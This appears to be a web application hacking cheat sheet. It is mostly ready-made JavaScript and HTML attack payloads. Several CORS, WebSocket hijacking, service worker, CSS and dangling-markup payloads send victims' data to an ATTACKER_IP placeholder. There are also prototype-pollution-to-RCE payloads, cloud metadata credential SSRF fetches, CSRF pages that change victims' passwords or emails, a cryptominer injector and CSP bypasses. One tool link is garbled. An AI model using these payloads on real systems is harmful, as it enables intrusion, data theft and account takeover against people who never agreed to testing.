document.querySelectorAll('[min],[max]').forEach(el => { el.removeAttribute('min'); el.removeAttribute('max'); });
```

### Network & Request Analysis

```javascript [Monitor All XHR Requests]
(function(){
  let origOpen = XMLHttpRequest.prototype.open;
  let origSend = XMLHttpRequest.prototype.send;
  XMLHttpRequest.prototype.open = function(method, url){
    this._url = url;
    this._method = method;
    console.log(`[XHR] ${method} ${url}`);
    return origOpen.apply(this, arguments);
  };
  XMLHttpRequest.prototype.send = function(body){
    if(body) console.log(`[XHR Body]`, body);
    this.addEventListener('load', function(){
      console.log(`[XHR Response] ${this._method} ${this._url}:`, this.responseText.substr(0,500));
    });
    return origSend.apply(this, arguments);
  };
})();
```

```javascript [Monitor All Fetch Requests]
(function(){
  let origFetch = window.fetch;
  window.fetch = function(){
    console.log('[Fetch]', arguments[0], arguments[1] || '');
    return origFetch.apply(this, arguments).then(response => {
      response.clone().text().then(body => {
        console.log('[Fetch Response]', response.url, response.status, body.substr(0,500));
      });
      return response;
    });
  };
})();
```

```javascript [Monitor WebSocket Messages]
(function(){
  let origWS = window.WebSocket;
  window.WebSocket = function(url, protocols){
    console.log('[WS] Connecting:', url);
    let ws = new origWS(url, protocols);
    let origSend = ws.send;
    ws.send = function(data){
      console.log('[WS Send]', data);
      return origSend.apply(this, arguments);
    };
    ws.addEventListener('message', function(e){
      console.log('[WS Receive]', e.data);
    });
    return ws;
  };
})();
```

```javascript [Extract All API Endpoints from JavaScript]
let scripts = document.querySelectorAll('script');
let endpoints = new Set();
scripts.forEach(s => {
  let text = s.textContent || '';
  let matches = text.match(/['"`](\/api\/[^'"`\s]+|https?:\/\/[^'"`\s]+)['"`]/g);
  if(matches) matches.forEach(m => endpoints.add(m.replace(/['"`]/g,'')));
});
console.log('API Endpoints Found:', [...endpoints]);
```

```javascript [Find Hardcoded Secrets in Scripts]
let patterns = {
  'API Key': /['"`](AIza[0-9A-Za-z_-]{35}|[A-Za-z0-9_]{20,50})['"`]/g,
  'AWS Key': /AKIA[0-9A-Z]{16}/g,
  'JWT': /eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+/g,
  'Password': /[pP]ass(word)?['"` ]*[:=]['"` ]*[^'"`\s]+/g,
  'Secret': /[sS]ecret['"` ]*[:=]['"` ]*[^'"`\s]+/g,
  'Token': /[tT]oken['"` ]*[:=]['"` ]*[^'"`\s]+/g,
};
document.querySelectorAll('script').forEach(s => {
  let text = s.textContent || '';
  for(let [name, regex] of Object.entries(patterns)){
    let matches = text.match(regex);
    if(matches) console.warn(`[${name}]`, matches);
  }
});
```

---

## Prototype Pollution

Prototype pollution occurs when an attacker can modify the prototype of a base JavaScript object (like `Object.prototype`), affecting all objects in the application.

### Understanding the Attack

```javascript [How Prototype Pollution Works]
// Normal object
let user = {name: "admin"};
console.log(user.isAdmin); // undefined

// Pollute Object.prototype
Object.prototype.isAdmin = true;

// Now ALL objects have isAdmin = true
console.log(user.isAdmin); // true
let newUser = {};
console.log(newUser.isAdmin); // true

// If the app checks: if(user.isAdmin) { grantAdmin() }
// Every user is now admin!
```

### Prototype Pollution Payloads

```javascript [__proto__ Pollution via JSON]
// If the app does: merge(target, JSON.parse(userInput))
{"__proto__": {"isAdmin": true}}
```

```javascript [constructor.prototype Pollution]
{"constructor": {"prototype": {"isAdmin": true}}}
```

```javascript [URL Parameter Pollution]
# In URL query strings:
?__proto__[isAdmin]=true
?__proto__.isAdmin=true
?constructor.prototype.isAdmin=true
?constructor[prototype][isAdmin]=true
```

```javascript [Nested Pollution]
{"__proto__": {"__proto__": {"polluted": true}}}
```

```javascript [Prototype Pollution to XSS — innerHTML gadget]
// If the app does: element.innerHTML = config.template || defaultTemplate
// Pollute the template:
{"__proto__": {"template": "<img src=x onerror=alert(1)>"}}
```

```javascript [Prototype Pollution to XSS — script src gadget]
{"__proto__": {"source": "http://ATTACKER_IP/evil.js"}}
{"__proto__": {"url": "javascript:alert(1)"}}
{"__proto__": {"href": "javascript:alert(1)"}}
```

```javascript [Prototype Pollution to RCE (Node.js)]
// If the app uses child_process.exec or spawn
{"__proto__": {"shell": "/proc/self/exe", "argv0": "console.log(require('child_process').execSync('id').toString())//"}}
{"__proto__": {"env": {"NODE_OPTIONS": "--require=/proc/self/environ"}}}
```

### Browser Console — Testing Prototype Pollution

```javascript [Check if Prototype is Pollutable]
// Test in console
let obj = {};
obj.__proto__.test = 'polluted';
let newObj = {};
console.log(newObj.test); // If 'polluted', it works!
delete Object.prototype.test; // Clean up
```

```javascript [Scan for Vulnerable Merge Functions]
// Look for deep merge, extend, or assign functions
let scripts = document.querySelectorAll('script');
scripts.forEach(s => {
  let text = s.textContent || '';
  if(text.match(/merge|extend|assign|deepCopy|clone/i)){
    console.warn('Potential merge function found in script');
  }
});
```

---

## CORS Misconfiguration Exploitation

Cross-Origin Resource Sharing (CORS) misconfigurations allow attackers to read responses from other origins — stealing data, tokens, and performing actions as the victim.

### CORS Attack Payloads

```javascript [Basic CORS Exploit — Steal API Response]
// Host this on your attacker server
// Victim visits this page while authenticated to target.com
<script>
fetch('https://target.com/api/user/profile', {
  credentials: 'include'
})
.then(r => r.text())
.then(data => {
  fetch('http://ATTACKER_IP/steal', {
    method: 'POST',
    body: data
  });
});
</script>
```

```javascript [CORS Exploit — Origin Reflection]
// If target reflects any origin in Access-Control-Allow-Origin:
<script>
var xhr = new XMLHttpRequest();
xhr.open('GET', 'https://target.com/api/sensitive-data', true);
xhr.withCredentials = true;
xhr.onreadystatechange = function(){
  if(xhr.readyState == 4){
    fetch('http://ATTACKER_IP/steal?data=' + encodeURIComponent(xhr.responseText));
  }
};
xhr.send();
</script>
```

```javascript [CORS Exploit — Null Origin]
// Some sites allow Access-Control-Allow-Origin: null
// Sandboxed iframes have a null origin
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" 
  src="data:text/html,<script>
    fetch('https://target.com/api/user', {credentials:'include'})
    .then(r=>r.text())
    .then(d=>fetch('http://ATTACKER_IP/steal',{method:'POST',body:d}))
  </script>">
</iframe>
```

```javascript [CORS Exploit — Subdomain Wildcard]
// If target allows *.target.com
// Find XSS on any subdomain, then:
<script>
fetch('https://api.target.com/user/data', {credentials: 'include'})
.then(r => r.json())
.then(data => {
  navigator.sendBeacon('http://ATTACKER_IP/steal', JSON.stringify(data));
});
</script>
```

### Browser Console — CORS Testing

```javascript [Test CORS Configuration]
fetch('https://target.com/api/endpoint', {
  credentials: 'include',
  headers: {'Origin': 'https://evil.com'}
}).then(r => {
  console.log('CORS Headers:', {
    'Allow-Origin': r.headers.get('Access-Control-Allow-Origin'),
    'Allow-Credentials': r.headers.get('Access-Control-Allow-Credentials'),
    'Allow-Methods': r.headers.get('Access-Control-Allow-Methods'),
    'Allow-Headers': r.headers.get('Access-Control-Allow-Headers')
  });
  return r.text();
}).then(console.log).catch(e => console.error('CORS Blocked:', e));
```

---

## CSRF via JavaScript

### CSRF Attack Payloads

```html [CSRF — Auto-Submit Form (POST)]
<html>
<body onload="document.getElementById('csrf').submit()">
<form id="csrf" action="https://target.com/api/change-email" method="POST">
  <input type="hidden" name="email" value="attacker@evil.com">
</form>
</body>
</html>
```

```html [CSRF — Fetch API (JSON Body)]
<script>
fetch('https://target.com/api/change-password', {
  method: 'POST',
  credentials: 'include',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({password: 'hacked123'})
});
</script>
```

```html [CSRF — XMLHttpRequest]
<script>
var xhr = new XMLHttpRequest();
xhr.open('POST', 'https://target.com/api/transfer', true);
xhr.withCredentials = true;
xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
xhr.send('to=attacker&amount=10000');
</script>
```

```html [CSRF — Image Tag (GET Request)]
<img src="https://target.com/api/delete-account?confirm=true" style="display:none">
```

```html [CSRF — Multiple Actions]
<script>
async function exploit() {
  // Step 1: Get CSRF token
  let resp = await fetch('https://target.com/settings', {credentials:'include'});
  let html = await resp.text();
  let token = html.match(/csrf[_-]?token.*?value="([^"]+)"/)[1];

  // Step 2: Use token to change email
  await fetch('https://target.com/api/change-email', {
    method: 'POST',
    credentials: 'include',
    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
    body: 'email=attacker@evil.com&csrf_token=' + token
  });
}
exploit();
</script>
```

---

## Clickjacking via JavaScript

```html [Basic Clickjacking — Invisible Iframe]
<html>
<head><title>Win a Prize!</title></head>
<body>
<h1>Click the button to claim your prize!</h1>
<button style="position:absolute;top:300px;left:100px;z-index:1;opacity:0.0001;width:200px;height:50px">
  I am the invisible button
</button>
<iframe src="https://target.com/settings/delete-account" 
  style="position:absolute;top:250px;left:50px;width:400px;height:300px;opacity:0.0001;z-index:2">
</iframe>
<div style="position:absolute;top:300px;left:100px;z-index:0;background:green;color:white;padding:15px 30px;font-size:20px;cursor:pointer">
  CLAIM PRIZE
</div>
</body>
</html>
```

```html [Drag-and-Drop Clickjacking]
<script>
// Trick user into dragging sensitive data from target iframe
// to attacker-controlled input
document.addEventListener('drop', function(e){
  e.preventDefault();
  let data = e.dataTransfer.getData('text');
  fetch('http://ATTACKER_IP/steal?data=' + encodeURIComponent(data));
});
</script>
```

---

## PostMessage Exploitation

### Finding Vulnerable Listeners

```javascript [Browser Console — Find postMessage Listeners]
// Check if the page listens for postMessage
// Search JavaScript source for 'addEventListener' + 'message'
document.querySelectorAll('script').forEach(s => {
  let text = s.textContent || '';
  if(text.includes('addEventListener') && text.includes('message')){
    console.warn('postMessage listener found in inline script!');
    // Check if origin is validated
    if(!text.includes('origin')){
      console.error('NO ORIGIN VALIDATION — VULNERABLE!');
    }
  }
});
```

```javascript [Browser Console — Monitor postMessage Events]
window.addEventListener('message', function(e){
  console.log('[postMessage Received]', {
    origin: e.origin,
    data: e.data,
    source: e.source
  });
}, false);
```

### PostMessage Attack Payloads

```html [Send Malicious postMessage — XSS via innerHTML]
<iframe src="https://target.com/vulnerable-page" id="target"></iframe>
<script>
setTimeout(function(){
  document.getElementById('target').contentWindow.postMessage(
    '<img src=x onerror=alert(document.domain)>',
    '*'
  );
}, 2000);
</script>
```

```html [Send Malicious postMessage — Change Config]
<iframe src="https://target.com/app" id="target"></iframe>
<script>
setTimeout(function(){
  document.getElementById('target').contentWindow.postMessage(
    JSON.stringify({type:'config', redirectUrl:'http://ATTACKER_IP/phish'}),
    '*'
  );
}, 2000);
</script>
```

```html [Send Malicious postMessage — JSONP Callback]
<iframe src="https://target.com/widget" id="target"></iframe>
<script>
setTimeout(function(){
  document.getElementById('target').contentWindow.postMessage(
    {action:'loadScript', url:'http://ATTACKER_IP/evil.js'},
    '*'
  );
}, 2000);
</script>
```

---

## WebSocket Attacks

### WebSocket Hijacking

```javascript [Browser Console — Intercept WebSocket Messages]
(function(){
  const OrigWS = window.WebSocket;
  window.WebSocket = function(url, protocols){
    console.log('[WS] New Connection:', url);
    const ws = protocols ? new OrigWS(url, protocols) : new OrigWS(url);
    
    const origSend = ws.send.bind(ws);
    ws.send = function(data){
      console.log('[WS OUT]', data);
      origSend(data);
    };
    
    ws.addEventListener('message', function(e){
      console.log('[WS IN]', e.data);
    });
    
    ws.addEventListener('open', function(){
      console.log('[WS] Connected');
    });
    
    ws.addEventListener('close', function(){
      console.log('[WS] Disconnected');
    });
    
    return ws;
  };
  console.log('[*] WebSocket interceptor installed');
})();
```

```html [Cross-Site WebSocket Hijacking (CSWSH)]
<script>
// If the WebSocket server doesn't check Origin header:
var ws = new WebSocket('wss://target.com/ws/chat');
ws.onopen = function(){
  ws.send(JSON.stringify({action:'getHistory'}));
};
ws.onmessage = function(e){
  // Steal all messages
  fetch('http://ATTACKER_IP/steal', {
    method:'POST',
    body: e.data
  });
};
</script>
```

```html [WebSocket Message Injection]
<script>
var ws = new WebSocket('wss://target.com/ws/chat');
ws.onopen = function(){
  // Send messages as the victim
  ws.send(JSON.stringify({
    action: 'sendMessage',
    to: 'admin',
    message: 'Please reset my password to hacked123'
  }));
};
</script>
```

---

## Content Security Policy (CSP) Bypass

### CSP Analysis

```javascript [Browser Console — Read Current CSP]
// Check meta tag CSP
let cspMeta = document.querySelector('meta[http-equiv="Content-Security-Policy"]');
if(cspMeta) console.log('CSP (meta):', cspMeta.content);

// Check response header CSP (must use DevTools Network tab)
console.log('Check DevTools > Network > Response Headers for Content-Security-Policy');
```

```javascript [Browser Console — CSP Violation Monitoring]
document.addEventListener('securitypolicyviolation', function(e){
  console.error('[CSP Violation]', {
    directive: e.violatedDirective,
    blocked: e.blockedURI,
    original: e.originalPolicy
  });
});
```

### CSP Bypass Payloads

```html [CSP Bypass — Base Tag Hijacking]
<!-- If CSP allows 'self' for scripts but doesn't restrict base-uri -->
<base href="http://ATTACKER_IP/">
<!-- Now relative script paths load from attacker server -->
<!-- <script src="/app.js"> loads http://ATTACKER_IP/app.js -->
```

```html [CSP Bypass — JSONP Endpoint]
<!-- If CSP allows a domain with JSONP endpoints -->
<!-- script-src: https://accounts.google.com -->
<script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1)//"></script>
```

```html [CSP Bypass — Angular CDN Allowed]
<!-- If CSP allows https://cdnjs.cloudflare.com or similar CDN -->
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.4.6/angular.js"></script>
<div ng-app ng-csp>{{$on.constructor('alert(1)')()}}</div>
```

```html [CSP Bypass — Whitelisted CDN with Prototype.js]
<script src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.3/prototype.js"></script>
<script>
document.body.innerHTML = '<img src=x onerror=alert(1)>';
</script>
```

```html [CSP Bypass — 'unsafe-eval' Present]
<!-- If script-src includes 'unsafe-eval' -->
<script>eval('alert(document.domain)')</script>
<script>setTimeout('alert(1)',0)</script>
<script>setInterval('alert(1)',1000)</script>
<script>new Function('alert(1)')()</script>
```

```html [CSP Bypass — 'unsafe-inline' Present]
<!-- If script-src includes 'unsafe-inline' -->
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<!-- Basically CSP is useless for XSS prevention -->
```

```html [CSP Bypass — Nonce Stealing via XSS]
<!-- If you can inject before a nonced script -->
<script nonce="STOLEN_NONCE">alert(1)</script>
```

```html [CSP Bypass — Nonce via Dangling Markup]
<!-- Steal nonce via injection before existing nonced script -->
<img src="http://ATTACKER_IP/steal?
<!-- The nonce attribute of the next script leaks in the request -->
```

```html [CSP Bypass — style-src with Exfiltration]
<!-- If style-src is permissive, exfiltrate data via CSS -->
<style>
input[value^="a"] { background: url('http://ATTACKER_IP/leak?char=a'); }
input[value^="b"] { background: url('http://ATTACKER_IP/leak?char=b'); }
/* Generate rules for each character */
</style>
```

```html [CSP Bypass — iframe srcdoc]
<iframe srcdoc="<script>alert(1)</script>"></iframe>
```

```html [CSP Bypass — meta redirect]
<meta http-equiv="refresh" content="0;url=http://ATTACKER_IP/steal?c=cookie_here">
```

```html [CSP Bypass — DNS Prefetch for Exfiltration]
<!-- If connect-src blocks but dns-prefetch is allowed -->
<link rel="dns-prefetch" href="//COOKIE_VALUE.ATTACKER_DOMAIN.com">
```

---

## DOM Clobbering

DOM Clobbering overwrites JavaScript variables and functions by creating HTML elements with specific `id` or `name` attributes.

```html [Basic DOM Clobbering]
<!-- If code does: if(window.admin) { grantAccess(); } -->
<form id="admin">
<!-- Now window.admin is truthy (the form element) -->
```

```html [DOM Clobbering — Override Config]
<!-- If code does: let url = config.url || '/default'; -->
<a id="config" href="http://ATTACKER_IP/evil"></a>
<!-- Now config (the anchor) has .url = undefined, but config.href = attacker URL -->
```

```html [DOM Clobbering — Override toString]
<!-- If code does: element.innerHTML = someVar; -->
<a id="someVar" href="javascript:alert(1)">
<!-- someVar.toString() returns the href value -->
```

```html [DOM Clobbering — Nested Properties]
<form id="config"><input id="apiUrl" value="http://ATTACKER_IP/evil"></form>
<!-- Now window.config.apiUrl.value === "http://ATTACKER_IP/evil" -->
```

```html [DOM Clobbering — Multiple Elements]
<a id="x"><a id="x" name="y" href="javascript:alert(1)">
<!-- x is now an HTMLCollection, x.y is the second anchor -->
```

---

## JavaScript Deobfuscation (Browser Console)

```javascript [Beautify Minified Code]
// Copy minified JS, paste in console:
let code = 'PASTE_MINIFIED_CODE_HERE';
// Or use browser DevTools > Sources > Pretty Print button {}
```

```javascript [Decode Hex Strings]
let hex = '\\x61\\x6c\\x65\\x72\\x74\\x28\\x31\\x29';
console.log(hex.replace(/\\x([0-9a-fA-F]{2})/g, (m, p) => String.fromCharCode(parseInt(p, 16))));
```

```javascript [Decode Unicode Strings]
let unicode = '\\u0061\\u006c\\u0065\\u0072\\u0074\\u0028\\u0031\\u0029';
console.log(unicode.replace(/\\u([0-9a-fA-F]{4})/g, (m, p) => String.fromCharCode(parseInt(p, 16))));
```

```javascript [Decode Base64]
console.log(atob('YWxlcnQoMSk='));
```

```javascript [Decode URL Encoding]
console.log(decodeURIComponent('%61%6c%65%72%74%28%31%29'));
```

```javascript [Decode String.fromCharCode]
console.log(String.fromCharCode(97,108,101,114,116,40,49,41));
```

```javascript [Decode Obfuscated eval]
// Replace eval() with console.log() to see what would execute
// Before: eval(someObfuscatedString)
// After:  console.log(someObfuscatedString)
```

```javascript [Decode Array-Based Obfuscation]
// Common pattern: var _0xabc = ['alert','constructor','return this'];
// Replace function calls with array lookups to understand the code
```

```javascript [Find eval/Function calls in page scripts]
document.querySelectorAll('script').forEach(s => {
  let text = s.textContent || '';
  if(text.match(/eval\s*\(|Function\s*\(|setTimeout\s*\(\s*['"`]|setInterval\s*\(\s*['"`]/)){
    console.warn('Potentially dangerous eval/Function usage found');
  }
});
```

---

## Service Worker Attacks

```javascript [Register Malicious Service Worker (via XSS)]
// If you have XSS on a page, you can register a service worker
// that intercepts ALL future requests on that origin
if('serviceWorker' in navigator){
  navigator.serviceWorker.register('/sw.js', {scope:'/'})
  .then(r => console.log('SW registered'))
  .catch(e => console.log('SW failed', e));
}
```

```javascript [Malicious Service Worker — sw.js (on attacker server)]
// This service worker intercepts all requests and exfiltrates data
self.addEventListener('fetch', function(e){
  // Log all requests
  fetch('http://ATTACKER_IP/sw-log?url=' + encodeURIComponent(e.request.url));

  // For specific URLs, modify the response
  if(e.request.url.includes('/api/')){
    e.respondWith(
      fetch(e.request).then(function(response){
        return response.clone().text().then(function(body){
          fetch('http://ATTACKER_IP/sw-steal', {
            method:'POST',
            body: JSON.stringify({url: e.request.url, body: body})
          });
          return response;
        });
      })
    );
  }
});
```

---

## JavaScript-Based Port Scanning

```javascript [Browser-Based Port Scanner]
async function scanPort(host, port, timeout=1000){
  return new Promise(resolve => {
    let img = new Image();
    let timer = setTimeout(() => {
      img.src = '';
      resolve({port, status:'filtered'});
    }, timeout);
    img.onload = () => { clearTimeout(timer); resolve({port, status:'open'}); };
    img.onerror = () => { clearTimeout(timer); resolve({port, status:'open'}); };
    img.src = `http://${host}:${port}/favicon.ico`;
  });
}

async function scan(host, ports){
  console.log(`Scanning ${host}...`);
  for(let port of ports){
    let result = await scanPort(host, port);
    if(result.status === 'open') console.log(`Port ${port}: OPEN`);
  }
}

scan('192.168.1.1', [21,22,23,25,53,80,110,143,443,445,993,995,3306,3389,5432,8080,8443]);
```

```javascript [WebSocket-Based Port Scanner (Faster)]
function wscan(host, port){
  return new Promise(resolve => {
    let ws = new WebSocket(`ws://${host}:${port}`);
    let timer = setTimeout(() => { ws.close(); resolve('filtered'); }, 1000);
    ws.onopen = () => { clearTimeout(timer); ws.close(); resolve('open'); };
    ws.onerror = () => { clearTimeout(timer); resolve('open_or_closed'); };
  });
}
```

```javascript [Fetch-Based Internal Network Scanner]
async function scanNetwork(subnet, port){
  for(let i=1; i<=254; i++){
    let ip = `${subnet}.${i}`;
    try{
      let controller = new AbortController();
      setTimeout(() => controller.abort(), 500);
      await fetch(`http://${ip}:${port}/`, {mode:'no-cors', signal:controller.signal});
      console.log(`${ip}:${port} — REACHABLE`);
    }catch(e){
      if(e.name !== 'AbortError') console.log(`${ip}:${port} — RESPONDED`);
    }
  }
}
scanNetwork('192.168.1', 80);
```

---

## SSRF via JavaScript

```javascript [Browser Console — Fetch Internal Resources]
// If you have XSS on a target web app:
// Use the victim's browser to access internal network resources

// AWS Metadata
fetch('http://169.254.169.254/latest/meta-data/iam/security-credentials/').then(r=>r.text()).then(console.log)

// GCP Metadata
fetch('http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token', {headers:{'Metadata-Flavor':'Google'}}).then(r=>r.text()).then(console.log)

// Internal Services
fetch('http://localhost:8080/admin').then(r=>r.text()).then(console.log)
fetch('http://192.168.1.1/').then(r=>r.text()).then(console.log)
fetch('http://10.0.0.1:9200/_cat/indices').then(r=>r.text()).then(console.log)  // Elasticsearch
fetch('http://localhost:6379/').then(r=>r.text()).then(console.log)  // Redis
```

---

## Dangling Markup Injection

When XSS is not possible but you can inject HTML, dangling markup can exfiltrate page content.

```html [Dangling Markup — Image Tag]
<img src="http://ATTACKER_IP/steal?content=
<!-- Everything after this tag until the next quote is sent to attacker -->
```

```html [Dangling Markup — Form Action Hijack]
<form action="http://ATTACKER_IP/steal">
<button type="submit">Click Me</button>
<!-- All form fields above this injection point are submitted to attacker -->
```

```html [Dangling Markup — Base Tag]
<base href="http://ATTACKER_IP/">
<!-- All relative URLs now point to attacker server -->
```

```html [Dangling Markup — Meta Refresh]
<meta http-equiv="refresh" content="0;url=http://ATTACKER_IP/steal?
<!-- Content after this leaks via the URL -->
```

---

## JavaScript Cryptominer Injection

```html [Inject Cryptominer (via XSS)]
<script>
// Educational example — this is what real attackers inject
// Never do this without authorization
let s = document.createElement('script');
s.src = 'https://coinhive.com/lib/coinhive.min.js'; // defunct but pattern still used
document.body.appendChild(s);
s.onload = function(){
  let miner = new CoinHive.Anonymous('SITE_KEY');
  miner.start();
};
</script>
```

---

## XSS Automation & Discovery Tools

::card-group
  ::card
  ---
  title: XSStrike
  icon: i-lucide-zap
  to: https://github.com/s0md3v/XSStrike
  target: _blank
  ---
  Most advanced XSS detection suite. Fuzzes parameters, generates context-aware payloads, crawls, and handles WAF bypass automatically.

  ```bash
  python3 xsstrike.py -u "http://target.com/search?q=test"
  python3 xsstrike.py -u "http://target.com/search?q=test" --crawl
  python3 xsstrike.py -u "http://target.com/search?q=test" --blind
  ```
  ::

  ::card
  ---
  title: Dalfox
  icon: i-lucide-fox
  to: https://github.com/hahwul/dalfox
  target: _blank
  ---
  Parameter analysis and XSS scanner. Extremely fast Go-based tool with built-in WAF evasion and blind XSS support.

  ```bash
  dalfox url "http://target.com/search?q=test"
  dalfox url "http://target.com/search?q=test" --blind http://ATTACKER_IP
  dalfox file urls.txt --silence --only-poc
  ```
  ::

  ::card
  ---
  title: kxss
  icon: i-lucide-search
  to: https://github.com/Emoe/kxss
  target: _blank
  ---
  Reflect parameter scanner. Quickly identifies which parameters reflect user input unfiltered — pre-XSS discovery.

  ```bash
  echo "http://target.com/search?q=FUZZ" | kxss
  cat urls.txt | kxss
  ```
  ::

  ::card
  ---
  title: XSS Hunter
  icon: i-lucide-radar
  to: https://xsshunter.trufflesecurity.com
  target: _blank
  ---
  Blind XSS detection platform. Provides callback payloads that capture screenshots, cookies, DOM, and more when triggered in admin panels.
  ::

  ::card
  ---
  title: Burp Suite (Intruder + Scanner)
  icon: i-lucide-bug
  to: https://portswigger.net/burp
  target: _blank
  ---
  Industry standard web app security tool. Active scanner detects reflected, stored, and DOM-based XSS automatically.
  ::

  ::card
  ---
  title: DOM Invader (Burp Extension)
  icon: i-lucide-file-code
  to: https://portswigger.net/burp/documentation/desktop/tools/dom-invader
  target: _blank
  ---
  Built into Burp's Chromium browser. Automatically finds DOM XSS sources and sinks, postMessage vulnerabilities, and prototype pollution.
  ::

  ::card
  ---
  title: JSParser
  icon: i-lucide-file-search
  to: https://github.com/nicholasgcoles/JSParser
  target: _blank
  ---
  Extracts endpoints and relative URLs from JavaScript files. Essential for API discovery and attack surface mapping.

  ```bash
  python3 handler.py
  # Browse to http://localhost:8008 and paste JS URLs
  ```
  ::

  ::card
  ---
  title: LinkFinder
  icon: i-lucide-link
  to: https://github.com/GerbenJav);do/LinkFinder
  target: _blank
  ---
  Discovers endpoints and their parameters in JavaScript files using regex.

  ```bash
  python3 linkfinder.py -i http://target.com/app.js -o cli
  python3 linkfinder.py -i http://target.com -d -o results.html
  ```
  ::

  ::card
  ---
  title: SecretFinder
  icon: i-lucide-key
  to: https://github.com/m4ll0k/SecretFinder
  target: _blank
  ---
  Finds API keys, tokens, and sensitive data in JavaScript files.

  ```bash
  python3 SecretFinder.py -i http://target.com/app.js -o cli
  ```
  ::

  ::card
  ---
  title: RetireJS
  icon: i-lucide-alert-triangle
  to: https://retirejs.github.io/retire.js/
  target: _blank
  ---
  Detects vulnerable JavaScript libraries. Available as CLI, browser extension, and Burp plugin.

  ```bash
  retire --js --path /path/to/js/files
  retire --js --jspath http://target.com/app.js
  ```
  ::
::

### Command-Line XSS Discovery Pipeline

```bash [Full XSS Discovery Workflow]
# Step 1: Collect URLs
echo "target.com" | waybackurls | sort -u > urls.txt
echo "target.com" | gau | sort -u >> urls.txt
sort -u urls.txt -o urls.txt

# Step 2: Filter for parameters
cat urls.txt | grep "=" | sort -u > params.txt

# Step 3: Check for reflection
cat params.txt | kxss | tee reflected.txt

# Step 4: Test reflected params with XSStrike
while read url; do
  python3 xsstrike.py -u "$url" --skip
done < reflected.txt

# Step 5: Test with Dalfox
cat params.txt | dalfox pipe --silence --only-poc | tee xss_findings.txt

# Step 6: Find JS files and extract endpoints
cat urls.txt | grep "\.js$" | sort -u > js_files.txt
while read js; do
  python3 linkfinder.py -i "$js" -o cli
done < js_files.txt

# Step 7: Check for vulnerable JS libraries
while read js; do
  retire --js --jsuri "$js"
done < js_files.txt
```

---

## XSS Payload Lists & Wordlists

::card-group
  ::card
  ---
  title: PortSwigger XSS Cheat Sheet
  icon: i-lucide-scroll-text
  to: https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
  target: _blank
  ---
  The most comprehensive XSS payload reference. Organized by event, tag, and browser. Includes payloads for every HTML element and event handler.
  ::

  ::card
  ---
  title: PayloadsAllTheThings — XSS
  icon: i-lucide-book-open
  to: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection
  target: _blank
  ---
  Massive repository of XSS payloads organized by type, context, filter bypass, and framework.
  ::

  ::card
  ---
  title: XSS Payload List (ismailtasdelen)
  icon: i-lucide-list
  to: https://github.com/ismailtasdelen/xss-payload-list
  target: _blank
  ---
  Large collection of XSS payloads for testing. Includes basic, advanced, and WAF bypass payloads.
  ::

  ::card
  ---
  title: SecLists — XSS
  icon: i-lucide-library
  to: https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/XSS
  target: _blank
  ---
  XSS fuzzing wordlists for automated testing. Use with Burp Intruder, ffuf, or custom scripts.
  ::

  ::card
  ---
  title: HTML5 Security Cheatsheet
  icon: i-lucide-shield
  to: https://html5sec.org
  target: _blank
  ---
  Browser-specific XSS vectors using HTML5 features. Tests categorized by browser compatibility.
  ::

  ::card
  ---
  title: Awesome-XSS
  icon: i-lucide-star
  to: https://github.com/s0md3v/AwesomeXSS
  target: _blank
  ---
  Curated list of XSS resources — tools, payloads, research papers, browser quirks, and more.
  ::
::

---

## Browser Extension Security Testing

```javascript [Console — List All Installed Extensions (Chrome)]
// Chrome extensions inject content scripts that are visible:
// Check for extension-specific elements
document.querySelectorAll('[class*="extension"],[id*="extension"],[data-extension]').forEach(el => {
  console.log('Extension element:', el);
});

// Check for chrome-extension:// resources
performance.getEntriesByType('resource').forEach(r => {
  if(r.name.includes('chrome-extension://') || r.name.includes('moz-extension://')){
    console.log('Extension resource:', r.name);
  }
});
```

```javascript [Console — Detect Specific Extensions]
// LastPass
if(document.querySelector('[data-lastpass-icon-root]')) console.log('LastPass detected');

// Grammarly
if(document.querySelector('grammarly-desktop-integration')) console.log('Grammarly detected');

// React DevTools
if(window.__REACT_DEVTOOLS_GLOBAL_HOOK__) console.log('React DevTools detected');

// Vue DevTools
if(window.__VUE_DEVTOOLS_GLOBAL_HOOK__) console.log('Vue DevTools detected');

// Redux DevTools
if(window.__REDUX_DEVTOOLS_EXTENSION__) console.log('Redux DevTools detected');
```

---

## JavaScript Framework-Specific Attacks

### React

```javascript [React — Access Component State]
// Find React root
let root = document.getElementById('root') || document.getElementById('app');
let reactFiber = Object.keys(root).find(k => k.startsWith('__reactFiber'));
let fiber = root[reactFiber];
console.log('React State:', fiber);
```

```javascript [React — Access Redux Store]
if(window.__REDUX_DEVTOOLS_EXTENSION__){
  // Redux store is accessible
  let store = window.__STORE__ || window.store;
  if(store){
    console.log('Redux State:', store.getState());
  }
}
```

### Angular

```javascript [Angular — Access Scope (AngularJS 1.x)]
let scope = angular.element(document.querySelector('[ng-app]')).scope();
console.log('Angular Scope:', scope);
```

```javascript [Angular — Template Injection Payloads]
// AngularJS 1.x Sandbox Escape (various versions)
// 1.0.1 - 1.1.5:
{{constructor.constructor('alert(1)')()}}

// 1.2.0 - 1.2.1:
{{a='constructor';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'alert(1)')()}}

// 1.2.19 - 1.2.23:
{{'a'.constructor.prototype.charAt=''.concat;$eval("x='y]|alert(1)|'")}}

// 1.6.0+: Sandbox removed, simple injection works
{{constructor.constructor('alert(1)')()}}
```

### Vue.js

```javascript [Vue — Access Component Data]
let vueEl = document.querySelector('[data-v-app]') || document.getElementById('app');
if(vueEl.__vue_app__){
  console.log('Vue 3 App:', vueEl.__vue_app__);
} else if(vueEl.__vue__){
  console.log('Vue 2 Instance:', vueEl.__vue__.$data);
}
```

```html [Vue.js Template Injection]
{{_openBlock.constructor('alert(1)')()}}
